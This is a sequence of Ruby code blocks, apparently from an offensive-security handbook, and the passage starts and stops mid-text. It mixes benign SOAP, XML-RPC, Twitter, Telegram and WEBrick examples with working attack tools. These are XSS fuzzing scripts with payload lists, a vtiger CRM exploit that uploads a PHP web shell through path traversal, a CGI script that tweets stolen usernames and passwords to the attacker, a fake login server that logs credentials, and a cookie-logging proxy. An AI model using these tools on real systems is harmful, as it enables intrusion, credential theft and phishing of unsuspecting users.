type=\"submit\" value=\"Send\" /></p>\n    </form>\n  </body>\n</html> \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'watir'\n\n@browser = Watir::Browser.new :firefox\n@browser.window.resize_to(800, 600)     # Set browser size\n@browser.window.move_to(400, 300)       # Allocate browser position\n\ndef sendpost(payload)\n  @browser.goto \"file:///home/KING/Code/example.html\"\n\n  @browser.text_field(name: 'field1').set(payload)\n  @browser.text_field(name: 'field2').set(payload)\n  @browser.text_field(name: 'field3').set(payload)\n  @browser.text_field(name: 'field4').set(payload)\n  sleep 0.1\n  @browser.button(value: 'Send').click\nend\n\npayloads =\n    [\n      '\"><script>alert(1)</script>',\n      '<img src=x onerror=alert(2)>'\n    ]\n\nputs \"[*] Exploitation start\"\nputs \"[*] Number of payloads: #{payloads.size} payloads\"\npayloads.each do |payload|\n  print \"\\r[*] Trying: #{payload}\"\n  print \"\\e[K\"\n  sendpost payload\n\n  if @browser.alert.exists?\n    @browser.alert.ok\n    puts \"[+] Exploit found!: \" + payload\n    @browser.close\n  end\nend \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'watir'\nrequire 'uri'\n\n@url = URI.parse \"http://example.com/Users/User_Edit.aspx?userid=68\"\n\n@browser = Watir::Browser.new :firefox\n@browser.window.resize_to(800, 600)\n# @browser.window.move_to(540, 165)\n@wait = Selenium::WebDriver::Wait.new(:timeout => 10)\n\n@browser.goto \"http://example.com/logon.aspx\"\n\n# Login\n@browser.text_field(name: 'Login1$UserName').set(\"admin\")\n@browser.text_field(name: 'Login1$Password').set(\"P@ssword\")\nsleep 0.5\n@browser.button(name: 'Login1$LoginButton').click\n\ndef sendpost(payload)\n  begin\n\n    @browser.switch                                                             # Make sure to focus on current tab/window\n    @browser.goto \"#{@url.scheme}://#{@url.host}/#{@url.path}?#{@url.query}\"    # Goto the URL\n    @wait.until {@browser.text_field(id: 'txtFullName').exists?}                # Wait until wanted text area appear\n    @browser.text_field(id: 'txtFullName').set(payload)                         # Set payload to the text area\n    @browser.text_field(id: 'txtFirstName').set(payload)                        # Set payload to the text area\n    @browser.button(name: '$actionsElem$save').click                            # Click Save button\n\n  rescue Selenium::WebDriver::Error::UnhandledAlertError\n    @browser.refresh                            # Refresh the current page\n    @wait.until {@browser.alert.exists?}        # Check if alert box appear\n  end\nend\n\npayloads =\n  [\n    \"\\\"><video src=x onerror=alert(1);>\",\n    \"<img src=x onerror='alert(2)'>\",\n    \"<script>alert(3)</script>\",\n    \"<svg/OnlOad=prompt(4)>\",\n    \"javascript:alert(5)\",\n    \"alert(/6/.source)\"\n  ]\n\nputs \"[*] Exploitation start\"\nputs \"[*] Number of payloads: #{payloads.size} payloads\"\n\n@browser.send_keys(:control, 't')                               # Sent Ctrl+T to open new tab\n@browser.goto \"http://example.com/pub_prof/user/silver.aspx\"    # Goto the use's public profile\n@browser.switch                                                 # Make sure to focus on current tab/window\n\npayloads.each do |payload|\n\n  @browser.send_keys(:alt, '1')                                     # Send Alt+1 to go to first tab\n  sendpost payload\n  puts \"[*] Sending to '#{@browser.title}' Payload : #{payload}\"\n  @browser.send_keys(:alt, '2')                                     # Send Alt+2 to go to second tab\n  @browser.switch\n  @browser.refresh\n  puts \"[*] Checking Payload Result on #{@browser.title}\"\n\n  if @browser.alert.exists?\n    @browser.alert.ok\n    puts\n    puts \"[+] Exploit found!: \" + payload\n    @browser.close\n    exit 0\n  end\n\nend\n\n@browser.close\nputs \n```", "```\n    gem install wasabi savon httpclient \n    ```", "```\nrequire 'wasabi'\n\nurl = \"http://www.webservicex.net/CurrencyConvertor.asmx?WSDL\"\n\ndocument = Wasabi.document url\n\n# Parsing the document\ndocument.parser\n\n# SOAP XML\ndocument.xml\n\n# Getting the endpoint\ndocument.endpoint\n\n# Getting the target namespace\ndocument.namespace\n\n# Enumerate all the SOAP operations/actions\ndocument.operations\n\n# Enumerate input parameters for particular operation\ndocument.operation_input_parameters :conversion_rate\n\n# Enumerate all available currencies\ndocument.parser.document.element_children.children[1].children[1].children[3].children[1].children.map {|c| c.attributes.values[0].to_s} \n```", "```\n>> url = \"http://www.webservicex.net/CurrencyConvertor.asmx?WSDL\"\n=> \"http://www.webservicex.net/CurrencyConvertor.asmx?WSDL\"\n>> document = Wasabi.document url\n=> #<Wasabi::Document:0x00000002c79a50 @adapter=nil, @document=\"http://www.webservicex.net/CurrencyConvertor.asmx?WSDL\">\n>> # Parsing the document\n>> document.parser\n=> #<Wasabi::Parser:0x0000000281ebb8\n @deferred_types=[],\n @document=\n  #(Document:0x140fa3c {\n    name = \"document\",\n    children = [\n      #(Element:0x140f294 {\n        name = \"definitions\",\n        namespace = #(Namespace:0x14017e8 { prefix = \"wsdl\", href = \"http://schemas.xmlsoap.org/wsdl/\" }),\n        attributes = [ #(Attr:0x1a507d4 { name = \"targetNamespace\", value = \"http://www.webserviceX.NET/\" })],\n        children = [\n          #(Text \"\\n  \"),\n---kipped---\n>> # Getting the endpoint\n>> document.endpoint\n=> #<URI::HTTP http://www.webservicex.net/CurrencyConvertor.asmx>\n>> # Getting the target namespace\n>> document.namespace\n=> \"http://www.webserviceX.NET/\"\n>> # Enumerate all the SOAP operations/actions\n>> document.operations\n=> {:conversion_rate=>\n  {:action=>\"http://www.webserviceX.NET/ConversionRate\",\n   :input=>\"ConversionRate\",\n   :output=>\"ConversionRateResponse\",\n   :namespace_identifier=>\"tns\",\n   :parameters=>{:FromCurrency=>{:name=>\"FromCurrency\", :type=>\"Currency\"}, :ToCurrency=>{:name=>\"ToCurrency\", :type=>\"Currency\"}}}}\n>> # Enumerate input parameters for particular operation\n>> document.operation_input_parameters :conversion_rate\n=> {:FromCurrency=>{:name=>\"FromCurrency\", :type=>\"Currency\"}, :ToCurrency=>{:name=>\"ToCurrency\", :type=>\"Currency\"}} \n```", "```\nrequire 'savon'\n\nurl = \"http://www.webservicex.net/CurrencyConvertor.asmx?WSDL\"\nclient = Savon.client(wsdl: url)\n\nmessage = {'FromCurrency' => 'EUR', 'ToCurrency' => 'CAD'}\nresponse = client.call(:conversion_rate, message: message).body\n\nresponse[:conversion_rate_response][:conversion_rate_result] \n```", "```\n>> message = {'FromCurrency' => 'EUR', 'ToCurrency' => 'CAD'}\n=> {\"FromCurrency\"=>\"EUR\", \"ToCurrency\"=>\"CAD\"}\n>> response = client.call(:conversion_rate, message: message).body\n=> {:conversion_rate_response=>{:conversion_rate_result=>\"1.4417\", :@xmlns=>\"http://www.webserviceX.NET/\"}}\n\n1.4415 \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n# gem install savon httpclient\n#\nrequire 'savon'\n\nif ARGV.size < 1\n  puts \"[+] ruby #{__FILE__} [WSDL URL]\"\n  exit 0\nelse\n  url = ARGV[0]\nend\n\nshell_data, shell_name = \"<?php system($_GET['cmd']); ?>\", \"shell-#{rand(100)}.php\"\n\n# Start client\nclient = Savon::Client.new(wsdl: url)\n\n# List all available operations\nputs \"[*] List all available operations \"\nputs client.operations\n\nputs \"\\n\\n[*] Interact with :add_email_attachment operation\"\nresponse = client.call( :add_email_attachment,\n                        message: {\n                                     emailid:  rand(100),\n                                     filedata: [shell_data].pack(\"m0\"),\n                                     filename: \"../../../../../../#{shell_name}\",\n                                     filesize: shell_data.size,\n                                     filetype: \"php\",\n                                     username: \"KING\",\n                                     sessionid: nil\n                                }\n                      )\nputs \"[+] PHP Shell on:  http://#{URI.parse(url).host}/vtigercrm/soap/#{shell_name}?cmd=id\" \n```", "```\nrequire 'http'\n\njson_res = JSON.parse(Net::HTTP.get(URI.parse \"http://api.stackexchange.com/2.2/questions?site=stackoverflow\")) \n```", "```\nrequire 'open-uri'\nrequire 'json'\nJSON.parse(open('https://api.ipify.org?format=json').read)[\"ip\"] \n```", "```\nrequire 'xmlrpc/client'\n\nopts =\n    {\n        host: '172.17.0.2',\n        path: '/xmlrpc.php',\n        port: 80,\n        proxy_host: nil,\n        proxy_port: nil,\n        user: 'admin',\n        password: '123123',\n        use_ssl: false,\n        timeout: 30\n    }\n\n# Create a new instance \nserver = XMLRPC::Client.new(\n    opts[:host], opts[:path], opts[:port],\n    opts[:proxy_host], opts[:proxy_port],\n    opts[:user], opts[:password],\n    opts[:use_ssl], opts[:timeout]\n)\n\n# Create a new instance takes a hash\nserver = XMLRPC::Client.new3(opts)\n\n# Say hello to WordPress\nresponse = server.call(\"demo.sayHello\")\n\n# List all available methods\nserver.call('system.listMethods', 0)\n\n# List all available users\nserver.call('wp.getAuthors', 0, opts[:user], opts[:password])\n\n# List all available post\nresponse = server.call('wp.getPosts', 0, opts[:user], opts[:password])\n\n# Create a new post!\npost =\n    {\n        \"post_title\"     => 'Rubyfu vs WP XML-RPC',\n        \"post_name\"      => 'Rubyfu vs WordPress XML-RPC',\n        \"post_content\"   => 'This is Pragmatic Rubyfu Post. Thanks for reading',\n        \"post_author\"    => 2,\n        \"post_status\"    => 'publish',\n        \"comment_status\" => 'open'\n    }\nresponse = server.call(\"wp.newPost\", 0, opts[:user], opts[:password], post)\n\n# Retrieve created post\nresponse =  server.call('wp.getPosts', 0, opts[:user], opts[:password], {\"post_type\" => \"post\", \"post_status\" => \"published\", \"number\" => \"2\", \"offset\" => \"2\"})\n\n# List all comments on a specific post\nresponse =  server.call('wp.getComments', 0, opts[:user], opts[:password], {\"post_id\" => 4}) \n```", "```\n>> # Say hello to WordPress\n>> response = server.call(\"demo.sayHello\")\n=> \"Hello!\"\n>> \n>> # List all available methods\n>> server.call('system.listMethods', 0)\n=> [\"system.multicall\",\n \"system.listMethods\",\n \"system.getCapabilities\",\n \"demo.addTwoNumbers\",\n \"demo.sayHello\",\n \"pingback.extensions.getPingbacks\",\n \"pingback.ping\",\n \"mt.publishPost\",\n \"mt.getTrackbackPings\",\n \"mt.supportedTextFilters\",\n ...skipping...\n \"metaWeblog.newMediaObject\",\n \"metaWeblog.getCategories\",\n \"metaWeblog.getRecentPosts\",\n \"metaWeblog.getPost\",\n \"metaWeblog.editPost\",\n \"metaWeblog.newPost\",\n ...skipping...\n \"blogger.deletePost\",\n \"blogger.editPost\",\n \"blogger.newPost\",\n \"blogger.getRecentPosts\",\n \"blogger.getPost\",\n \"blogger.getUserInfo\",\n \"blogger.getUsersBlogs\",\n \"wp.restoreRevision\",\n \"wp.getRevisions\",\n \"wp.getPostTypes\",\n \"wp.getPostType\",\n ...skipping...\n \"wp.getPost\",\n \"wp.deletePost\",\n \"wp.editPost\",\n \"wp.newPost\",\n \"wp.getUsersBlogs\"]\n>> \n>> # List all available users\n>> server.call('wp.getAuthors', 0, opts[:user], opts[:password])\n=> [{\"user_id\"=>\"1\", \"user_login\"=>\"admin\", \"display_name\"=>\"admin\"}, {\"user_id\"=>\"3\", \"user_login\"=>\"galaxy\", \"display_name\"=>\"Galaxy\"}, {\"user_id\"=>\"2\", \"user_login\"=>\"Rubyfu\", \"display_name\"=>\"Rubyfu\"}]\n>> \n>> # List all available post\n>> response = server.call('wp.getPosts', 0, opts[:user], opts[:password])\n=> [{\"post_id\"=>\"4\",\n  \"post_title\"=>\"Rubyfu vs WP XMLRPC\",\n  \"post_date\"=>#<XMLRPC::DateTime:0x0000000227f3b0 @day=1, @hour=19, @min=44, @month=11, @sec=31, @year=2015>,\n  \"post_date_gmt\"=>#<XMLRPC::DateTime:0x0000000227d178 @day=1, @hour=19, @min=44, @month=11, @sec=31, @year=2015>,\n  \"post_modified\"=>#<XMLRPC::DateTime:0x000000021d6ee0 @day=1, @hour=19, @min=52, @month=11, @sec=25, @year=2015>,\n  \"post_modified_gmt\"=>#<XMLRPC::DateTime:0x000000021d4ca8 @day=1, @hour=19, @min=52, @month=11, @sec=25, @year=2015>,\n  \"post_status\"=>\"publish\",\n  \"post_type\"=>\"post\",\n  \"post_name\"=>\"rubyfu-vs-wordpress-xmlrpc\",\n  \"post_author\"=>\"2\",\n  \"post_password\"=>\"\",\n  \"post_excerpt\"=>\"\",\n  \"post_content\"=>\"This is Pragmatic Rubyfu Post. Thanks for reading\",\n  \"post_parent\"=>\"0\",\n  \"post_mime_type\"=>\"\",\n  \"link\"=>\"http://172.17.0.2/2015/11/01/rubyfu-vs-wordpress-xmlrpc/\",\n  \"guid\"=>\"http://172.17.0.2/?p=4\",\n  \"menu_order\"=>0,\n  \"comment_status\"=>\"open\",\n  \"ping_status\"=>\"open\",\n  \"sticky\"=>false,\n  \"post_thumbnail\"=>[],\n  \"post_format\"=>\"standard\",\n  \"terms\"=>\n   [{\"term_id\"=>\"1\", \"name\"=>\"Uncategorized\", \"slug\"=>\"uncategorized\", \"term_group\"=>\"0\", \"term_taxonomy_id\"=>\"1\", \"taxonomy\"=>\"category\", \"description\"=>\"\", \"parent\"=>\"0\", \"count\"=>2, \"filter\"=>\"raw\"}],\n  \"custom_fields\"=>[]},\n {\"post_id\"=>\"1\",\n  \"post_title\"=>\"Hello world!\",\n  \"post_date\"=>#<XMLRPC::DateTime:0x00000002735580 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_date_gmt\"=>#<XMLRPC::DateTime:0x0000000226b130 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_modified\"=>#<XMLRPC::DateTime:0x00000002268de0 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_modified_gmt\"=>#<XMLRPC::DateTime:0x000000021aea58 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_status\"=>\"publish\",\n  \"post_type\"=>\"post\",\n  \"post_name\"=>\"hello-world\",\n  \"post_author\"=>\"1\",\n  \"post_password\"=>\"\",\n  \"post_excerpt\"=>\"\",\n  \"post_content\"=>\"Welcome to WordPress. This is your first post. Edit or delete it, then start writing!\",\n  \"post_parent\"=>\"0\",\n  \"post_mime_type\"=>\"\",\n  \"link\"=>\"http://172.17.0.2/2015/11/01/hello-world/\",\n  \"guid\"=>\"http://172.17.0.2/?p=1\",\n  \"menu_order\"=>0,\n  \"comment_status\"=>\"open\",\n  \"ping_status\"=>\"open\",\n  \"sticky\"=>false,\n  \"post_thumbnail\"=>[],\n  \"post_format\"=>\"standard\",\n  \"terms\"=>\n   [{\"term_id\"=>\"1\", \"name\"=>\"Uncategorized\", \"slug\"=>\"uncategorized\", \"term_group\"=>\"0\", \"term_taxonomy_id\"=>\"1\", \"taxonomy\"=>\"category\", \"description\"=>\"\", \"parent\"=>\"0\", \"count\"=>2, \"filter\"=>\"raw\"}],\n  \"custom_fields\"=>[]}]\n>> \n>> # Create a new post!\n>> post =\n | {    \n |   \"post_title\"     => 'Rubyfu vs WP XML-RPC',        \n |   \"post_name\"      => 'Rubyfu vs WordPress XML-RPC',        \n |   \"post_content\"   => 'This is Pragmatic Rubyfu Post. Thanks for reading',        \n |   \"post_author\"    => 2,        \n |   \"post_status\"    => 'publish',        \n |   \"comment_status\" => 'open'        \n | }      \n=> {\"post_title\"=>\"Rubyfu vs WP XML-RPC\",\n \"post_name\"=>\"Rubyfu vs WordPress XML-RPC\",\n \"post_content\"=>\"This is Pragmatic Rubyfu Post. Thanks for reading\",\n \"post_author\"=>2,\n \"post_status\"=>\"publish\",\n \"comment_status\"=>\"open\"}\n>> response = server.call(\"wp.newPost\", 0, opts[:user], opts[:password], post)\n=> \"7\"\n>> # Retrieve created post\n>> response =  server.call('wp.getPosts', 0, opts[:user], opts[:password], {\"post_type\" => \"post\", \"post_status\" => \"published\", \"number\" => \"2\", \"offset\" => \"2\"})\n=> [{\"post_id\"=>\"3\",\n  \"post_title\"=>\"Auto Draft\",\n  \"post_date\"=>#<XMLRPC::DateTime:0x0000000225bcd0 @day=1, @hour=19, @min=22, @month=11, @sec=29, @year=2015>,\n  \"post_date_gmt\"=>#<XMLRPC::DateTime:0x00000002259a98 @day=1, @hour=19, @min=22, @month=11, @sec=29, @year=2015>,\n  \"post_modified\"=>#<XMLRPC::DateTime:0x0000000256b808 @day=1, @hour=19, @min=22, @month=11, @sec=29, @year=2015>,\n  \"post_modified_gmt\"=>#<XMLRPC::DateTime:0x000000025695d0 @day=1, @hour=19, @min=22, @month=11, @sec=29, @year=2015>,\n  \"post_status\"=>\"auto-draft\",\n  \"post_type\"=>\"post\",\n  \"post_name\"=>\"\",\n  \"post_author\"=>\"1\",\n  \"post_password\"=>\"\",\n  \"post_excerpt\"=>\"\",\n  \"post_content\"=>\"\",\n  \"post_parent\"=>\"0\",\n  \"post_mime_type\"=>\"\",\n  \"link\"=>\"http://172.17.0.2/?p=3\",\n  \"guid\"=>\"http://172.17.0.2/?p=3\",\n  \"menu_order\"=>0,\n  \"comment_status\"=>\"open\",\n  \"ping_status\"=>\"open\",\n  \"sticky\"=>false,\n  \"post_thumbnail\"=>[],\n  \"post_format\"=>\"standard\",\n  \"terms\"=>[],\n  \"custom_fields\"=>[]},\n {\"post_id\"=>\"1\",\n  \"post_title\"=>\"Hello world!\",\n  \"post_date\"=>#<XMLRPC::DateTime:0x00000002617298 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_date_gmt\"=>#<XMLRPC::DateTime:0x00000002615038 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_modified\"=>#<XMLRPC::DateTime:0x000000025e6d28 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_modified_gmt\"=>#<XMLRPC::DateTime:0x000000025e4aa0 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_status\"=>\"publish\",\n  \"post_type\"=>\"post\",\n  \"post_name\"=>\"hello-world\",\n  \"post_author\"=>\"1\",\n  \"post_password\"=>\"\",\n  \"post_excerpt\"=>\"\",\n  \"post_content\"=>\"Welcome to WordPress. This is your first post. Edit or delete it, then start writing!\",\n  \"post_parent\"=>\"0\",\n  \"post_mime_type\"=>\"\",\n  \"link\"=>\"http://172.17.0.2/2015/11/01/hello-world/\",\n  \"guid\"=>\"http://172.17.0.2/?p=1\",\n  \"menu_order\"=>0,\n  \"comment_status\"=>\"open\",\n  \"ping_status\"=>\"open\",\n  \"sticky\"=>false,\n  \"post_thumbnail\"=>[],\n  \"post_format\"=>\"standard\",\n  \"terms\"=>\n   [{\"term_id\"=>\"1\", \"name\"=>\"Uncategorized\", \"slug\"=>\"uncategorized\", \"term_group\"=>\"0\", \"term_taxonomy_id\"=>\"1\", \"taxonomy\"=>\"category\", \"description\"=>\"\", \"parent\"=>\"0\", \"count\"=>3, \"filter\"=>\"raw\"}],\n  \"custom_fields\"=>[]}]\n...skipping...\n  \"post_format\"=>\"standard\",\n  \"terms\"=>[],\n  \"custom_fields\"=>[]},\n {\"post_id\"=>\"1\",\n  \"post_title\"=>\"Hello world!\",\n  \"post_date\"=>#<XMLRPC::DateTime:0x00000002617298 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_date_gmt\"=>#<XMLRPC::DateTime:0x00000002615038 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_modified\"=>#<XMLRPC::DateTime:0x000000025e6d28 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_modified_gmt\"=>#<XMLRPC::DateTime:0x000000025e4aa0 @day=1, @hour=17, @min=54, @month=11, @sec=14, @year=2015>,\n  \"post_status\"=>\"publish\",\n  \"post_type\"=>\"post\",\n  \"post_name\"=>\"hello-world\",\n  \"post_author\"=>\"1\",\n  \"post_password\"=>\"\",\n  \"post_excerpt\"=>\"\",\n  \"post_content\"=>\"Welcome to WordPress. This is your first post. Edit or delete it, then start writing!\",\n  \"post_parent\"=>\"0\",\n  \"post_mime_type\"=>\"\",\n  \"link\"=>\"http://172.17.0.2/2015/11/01/hello-world/\",\n  \"guid\"=>\"http://172.17.0.2/?p=1\",\n  \"menu_order\"=>0,\n  \"comment_status\"=>\"open\",\n  \"ping_status\"=>\"open\",\n  \"sticky\"=>false,\n  \"post_thumbnail\"=>[],\n  \"post_format\"=>\"standard\",\n  \"terms\"=>\n   [{\"term_id\"=>\"1\", \"name\"=>\"Uncategorized\", \"slug\"=>\"uncategorized\", \"term_group\"=>\"0\", \"term_taxonomy_id\"=>\"1\", \"taxonomy\"=>\"category\", \"description\"=>\"\", \"parent\"=>\"0\", \"count\"=>3, \"filter\"=>\"raw\"}],\n  \"custom_fields\"=>[]}] \n```", "```\n    gem install twitter \n    ```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'twitter'\nrequire 'pp'\n\nclient = Twitter::REST::Client.new do |config|\n        config.consumer_key        = \"YOUR_CONSUMER_KEY\"\n        config.consumer_secret     = \"YOUR_CONSUMER_SECRET\"\n        config.access_token        = \"YOUR_ACCESS_TOKEN\"\n        config.access_token_secret = \"YOUR_ACCESS_SECRET\"\nend\n\nputs client.user(\"Rubyfu\")                   # Fetch a user\nputs client.update(\"@Rubyfu w00t! #Rubyfu\")  # Tweet (as the authenticated user)\nputs client.follow(\"Rubyfu\")                 # Follow User (as the authenticated user)\nputs client.followers(\"Rubyfu\")              # Fetch followers of a user\nputs client.followers                        # Fetch followers of current user\nputs client.status(649235138585366528)       # Fetch a particular Tweet by ID\nputs client.create_direct_message(\"Rubyfu\", \"Hi, I'm KINGSABRI\")    # Send direct message to a particular user \n```", "```\n#!/usr/bin/ruby -w\n\nrequire 'cgi'\nrequire 'uri'\nrequire 'twitter'\n\ncgi  = CGI.new\nputs cgi.header\n\nuser = CGI.escape cgi['user']\npass = CGI.escape cgi['pass']\ntime = Time.now.strftime(\"%D %T\")\n\nclient = Twitter::REST::Client.new do |config|\n        config.consumer_key        = \"YOUR_CONSUMER_KEY\"\n        config.consumer_secret     = \"YOUR_CONSUMER_SECRET\"\n        config.access_token        = \"YOUR_ACCESS_TOKEN\"\n        config.access_token_secret = \"YOUR_ACCESS_SECRET\"\nend\nclient.user(\"KINGSABRI\")\n\nif cgi.referer.nil? or cgi.referer.empty?\n    # Twitter notification | WARNING! It's tweets, make sure your account is protected!!!\n    client.update(\"[Info] No Referer!\\n\" + \"#{CGI.unescape user}:#{CGI.unescape pass}\")\nelse\n    client.update(\"[Info] #{cgi.referer}\\n #{CGI.unescape user}:#{CGI.unescape pass}\")\nend\n\nputs \"\" \n```", "```\n    gem install telegram-bot-ruby \n    ```", "```\nrequire 'telegram/bot'\n\ntoken = 'YOUR_TELEGRAM_BOT_API_TOKEN'\n\nTelegram::Bot::Client.run(token) do |bot|\n  bot.listen do |message|\n    case message.text\n    when '/start'\n      bot.api.send_message(chat_id: message.chat.id, text: \"Hello, #{message.from.first_name}\")\n    when '/stop'\n      bot.api.send_message(chat_id: message.chat.id, text: \"Bye, #{message.from.first_name}\")\n    when '/rubyfu'\n      bot.api.send_message(chat_id: message.chat.id, text: \"Rubyfu, where Ruby goes eveil!\")\n    end\n  end\nend \n```", "```\nrequire 'telegram/bot'\n\nbot.listen do |message|\n  case message\n  when Telegram::Bot::Types::InlineQuery\n    results = [\n      Telegram::Bot::Types::InlineQueryResultArticle\n        .new(id: 1, title: 'First article', message_text: 'Very interesting text goes here.'),\n      Telegram::Bot::Types::InlineQueryResultArticle\n        .new(id: 2, title: 'Second article', message_text: 'Another interesting text here.')\n    ]\n    bot.api.answer_inline_query(inline_query_id: message.id, results: results)\n  when Telegram::Bot::Types::Message\n    bot.api.send_message(chat_id: message.chat.id, text: \"Hello, #{message.from.first_name}!\")\n  end\nend \n```", "```\n    npm install -g coffee-script \n    ```", "```\n    coffee --watch --compile script.coffee \n    ```", "```\n    gem install coffee-script \n    ```", "```\n#!/usr/bin/env ruby\nrequire 'coffee-script'\nif ARGF\n  file = File.open(\"#{ARGV[0]}.js\", 'a')\n  file.write CoffeeScript.compile(ARGF.read)\nend \n```", "```\nruby coffee2js.rb exploit.coffee \n```", "```\n    gem install opal opal-jquery \n    ```", "```\nruby -run -e httpd /var/www/ -p 8000 \n```", "```\nrequire 'webrick'\nserver = WEBrick::HTTPServer.new :Port => 8000, :DocumentRoot => '/var/www/'\n# WEBrick::Daemon.start   # Stating WEBRick as a daemon\nserver.start \n```", "```\nrequire 'webrick'\nrequire 'webrick/https'\n\ncert = [\n  %w[CN localhost],\n]\n\nserver = WEBrick::HTTPServer.new(:Port         => 8000,\n                                 :SSLEnable    => true,\n                                 :SSLCertName  => cert,\n                                 :DocumentRoot => '/var/www/')\nserver.start \n```", "```\n#!/usr/bin/env ruby\n#\n# KING SABRI | @KINGSABRI\n#\nrequire 'webrick'\n\n#\n# Servlet: Is a Web Server with custom behavior class\n# It's a subclass of WEBrick::HTTPServlet::AbstractServlet\n#\nclass RubyfuServlet < WEBrick::HTTPServlet::AbstractServlet\n\n  # Control 'GET' request/response\n  def do_GET(req, res)\n    res.status = 200\n    res['Content-Type']   = \"text/html; charset=UTF-8\"\n    res['Server']         = \"Rubyfu WebServer\"\n    res['Cache-Control']  = \"no-store, no-cache,\"\n    res.body              = print_login(req)\n  end\n\n  private\n  # Show login\n  def print_login(req)\n    html = %q{\n      <center>\n        <table cellpadding=\"3\" border=\"1\">\n        <tr><td colspan=\"2\"><center><h4><b>Enter your Username and Password</b></h4></center></td></tr>\n        <form method=\"POST\" action=\"/login\">\n                <tr><td><strong><b>Username:</b></strong></td><td><input name=\"username\" type=\"text\"></td></tr>\n                <tr><td><strong><b>Password:</b></strong></td><td><input name=\"password\" type=\"password\"></td></tr>\n                <tr><td colspan=\"2\"><center><h1><b><input type=\"submit\" value=\"Login\" /></b></h1></center></td></tr>\n        </form>\n        </table>\n      </center>\n    }\n  end\n\nend\n\nclass Login < WEBrick::HTTPServlet::AbstractServlet\n\n  # Control 'POST' request/response\n  def do_POST(req, res)\n    status, content_type, body = save_login(req)\n    res.body  = body\n  end\n\n  # Save POST request\n  def save_login(req)\n    username, password = req.query['username'], req.query['password']\n\n    if !(username && password).empty?\n      # Print Credentials to console\n      puts \"\\n-----[ START OF POST ]-----\"\n      puts \"[+] #{username}:#{password}\"\n      puts \"-----[ END OF POST ]-----\\n\\n\"\n      # Write Credentials to file\n      File.open(\"credentials.txt\", '+a') {|f| f.puts \"#{username}:#{password}\"}\n      return 200, 'text/plain', 'Success! Thank you.'\n    else\n      puts \"[!] Empty username and password.\"\n      return 404, 'text/plain', 'Wrong username or password!'\n    end\n\n  end\nend\n\nbegin\n  port = ARGV[0]\n  raise if ARGV.size < 1\n\n  # Start Web Server\n  puts \"[+] Starting HTTP server on port: #{port}\\n\"\n  server = WEBrick::HTTPServer.new(ServerName: \"Rubyfu HTTP Server\",\n                                   Port: port,\n                                   BindAddress: '0.0.0.0',\n                                   AccessLog: [],\n                                   Logger: WEBrick::Log.new(File.open(File::NULL, 'w'))\n                                   )\n  server.mount(\"/\", RubyfuServlet)\n  server.mount(\"/login\", Login)\n  trap \"INT\" do server.shutdown end\n  server.start\n\nrescue Exception => e\n  puts \"ruby #{__FILE__} <WEB_SERVER_PORT>\" if ARGV.size < 1\n  puts e, e.backtrace\n  exit 0\nend \n```", "```\nruby webrick-server.rb 8080\n[+] Starting HTTP server on port: 8080\n\n-----[ START OF POST ]-----\n[+] admin:AdminPassw0rd@!\n-----[ END OF POST ]-----\n\n-----[ START OF POST ]-----\n[+] support:Puppies\n-----[ END OF POST ]-----\n\n[!] Empty username and password.\n\n-----[ START OF POST ]-----\n[+] user1:12345678\n-----[ END OF POST ]----- \n```", "```\nrequire 'webrick'\nrequire 'webrick/httpproxy'\n\nhandler = proc do |req, res|\n  puts \"[*] Request\"\n  puts req.inspect\n  request = req.request_line.split\n  puts \"METHOD: \"      + \"#{request[0]}\"\n  puts \"Request URL: \" + \"#{request[1]}\"\n  puts \"Request path: \"+ \"#{req.path}\"\n  puts \"HTTP: \"        + \"#{request[2]}\"\n  puts \"Referer: \"     + \"#{req['Referer']}\"\n  puts \"User-Agent: \"  + \"#{req['User-Agent']}\"\n  puts \"Host: \"        + \"#{req['Host']}\"\n  puts \"Cookie: \"      + \"#{req['Cookie']}\"\n  puts \"Connection: \"  + \"#{req['Connection']}\"\n  puts \"Accept: \"      + \"#{req['accept']}\"\n  puts \"Full header: \" + \"#{req.header}\"\n  puts \"Body: \"        + \"#{req.body}\"\n  puts \"----------[END OF REQUEST]----------\"\n  puts \"\\n\\n\"\n\n  puts \"[*] Response\"\n  puts res.inspect\n  puts \"Full header: \" + \"#{res.header}\"\n  puts \"Body: \" + \"#{res.body}\"\n  puts \"----------[END OF RESPONSE]----------\"\n  puts \"\\n\\n\\n\"\nend\n\nproxy = WEBrick::HTTPProxyServer.new Port: 8000,\n                                     ServerName: \"RubyFuProxyServer\",\n                                     ServerSoftware: \"RubyFu Proxy\",\n                                     ProxyContentHandler: handler\n\ntrap 'INT'  do proxy.shutdown end\n\nproxy.start \n```", "```\n#!/usr/bin/env ruby\nrequire 'webrick'\nrequire 'webrick/httpproxy'\n\n# Start creating the config\nconfig = { :Realm => 'RubyFuSecureProxy' }\n# Create an htpasswd database file in the same script path\nhtpasswd = WEBrick::HTTPAuth::Htpasswd.new 'rubyfuhtpasswd'\n# Set authentication type\nhtpasswd.auth_type = WEBrick::HTTPAuth::DigestAuth\n# Add user to the password config\nhtpasswd.set_passwd config[:Realm], 'rubyfu', 'P@ssw0rd'\n# Flush the database (Save changes)\nhtpasswd.flush\n# Add the database to the config\nconfig[:UserDB] = htpasswd\n# Create a global DigestAuth based on the config\n@digest_auth = WEBrick::HTTPAuth::DigestAuth.new config\n\n# Authenticate requests and responses\nhandler = proc do |request, response|\n  @digest_auth.authenticate request, response\nend\n\nproxy = WEBrick::HTTPProxyServer.new Port: 8000,\n                                     ServerName: \"RubyFuSecureProxy\",\n                                     ServerSoftware: 